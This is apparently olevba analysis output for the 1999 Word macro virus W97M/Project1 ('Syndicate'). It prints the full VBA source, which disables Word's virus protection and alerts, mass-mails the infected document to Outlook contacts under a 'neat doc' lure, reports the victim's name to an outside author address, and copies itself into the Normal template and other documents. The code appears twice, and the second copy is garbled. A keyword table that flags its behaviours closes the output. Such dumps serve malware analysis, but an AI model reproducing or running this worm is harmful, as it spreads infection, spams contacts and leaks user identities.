olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Syndicate
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Syndicate - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

On Error Resume Next

s = ActiveDocument.Saved

Application.DisplayStatusBar = 0: Application.DisplayAlerts = 0
Options.VirusProtection = 0: Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0: Application.EnableCancelKey = 0

Dim POUTLOOK, MAPInam, Newm
Set a = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set t = ThisDocument.VBProject.VBComponents(1).CodeModule
Set n = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set POUTLOOK = CreateObject("Outlook.Application")
Set MAPInam = POUTLOOK.GetNameSpace("MAPI")

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") <> "Syndicate" Then
If POUTLOOK = "Outlook" Then
MAPInam.Logon "profile", "password"
For Q = 1 To MAPInam.AddressLists.Count
Set ADBK = MAPInam.AddressLists(Q)
Z = 1
Set Newm = POUTLOOK.CreateItem(0)
For CB = 1 To ADBK.AddressEntries.Count
DEM = ADBK.AddressEntries(Z)
Newm.Recipients.Add DEM
Z = Z + 1
If Z > 69 Then CB = ADBK.AddressEntries.Count
Next CB
Newm.Subject = "Fun and games from " & Application.UserName
Newm.Body = "Hi! Check out this neat doc I found on the Internet!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
DEM = ""
Next Q

hisyn = "Project1@nym.alias.net"
Newm.Recipients.Add hisyn
Newm.Subject = "Guess whos infected: " & Application.UserName
Newm.Body = "infected!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
MAPInam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") = "Syndicate"
End If

If a.CountOfLines < t.CountOfLines Then
a.AddFromString t.Lines(1, t.CountOfLines)
ActiveDocument.Save
ElseIf n.CountOfLines < t.CountOfLines Then
n.AddFromString t.Lines(1, t.CountOfLines)
End If

ActiveDocument.Saved = s
'W97M/Project1 by Patient Zero -(The Syndicate)- circa 1999
'The Syndicate: underground to the underground.
'Greets to Kwyjibo and the CodeBreakers: Hey, dont we know each other? ;-)
End Sub





Private Sub Document_New()

End Sub

On Error Resume Next

s = ActiveDocument.Saved

Application.DisplayStatusBar = 0: Application.DisplayAlerts = 0
Options.VirusProtection = 0: Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0: Application.EnableCancelKey = 0

Dim POUTLOOK, MAPInam, Newm
Set a = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set t = ThisDocument.VBProject.VBComponents(1).CodeModule
Set n = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set POUTLOOK = CreateObject("Outlook.Application")
Set MAPInam = POUTLOOK.GetNameSpace("MAPI")

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") <> "Syndicate" Then
If POUTLOOK = "Outlook" Then
MAPInam.Logon "profile", "password"
For Q = 1 To MAPInam.AddressLists.Count
Set ADBK = MAPInam.AddressLists(Q)
Z = 1
Set Newm = POUTLOOK.CreateItem(0)
For CB = 1 To ADBK.AddressEntries.Count
DEM = ADBK.AddressEntries(Z)
Newm.Recipients.Add DEM
Z = Z + 1
If Z > 69 Then CB = ADBK.AddressEntries.Count
Next CB
Newm.Subject = "Fun and games from " & Application.UserName
Newm.Body = "Hi! Check out this neat doc I found on the Internet!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
DEM = ""
Next Q

hisyn = "Project1@nym.alias.net"
Newm.Recipients.Add hisyn
Newm.Subject = "Guess whos infected: " & Application.UserName
Newm.Body = "infected!"
Newm.Attachments.Add ActiveDocument.FullName
Newm.Send
MAPInam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "P1") = "Syndicate"
End If

If a.CountOfLines < t.CountOfLines Then
a.AddFromString t.Lines(1, t.CountOfLines)
ActiveDocument.Save
ElseIf n.CountOfLines < t.CountOfLines Then
n.AddFromString t.Lines(1, t.CountOfLines)
End If

ActiveDocument.Saved = s
'W97M/Project1 by Patient Zero -(The Syndicate)- circa 1999
'The Syndicate: underground to the underground.
'Greets to Kwyjibo and the CodeBreakers: Hey, dont we know each other? ;-)
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

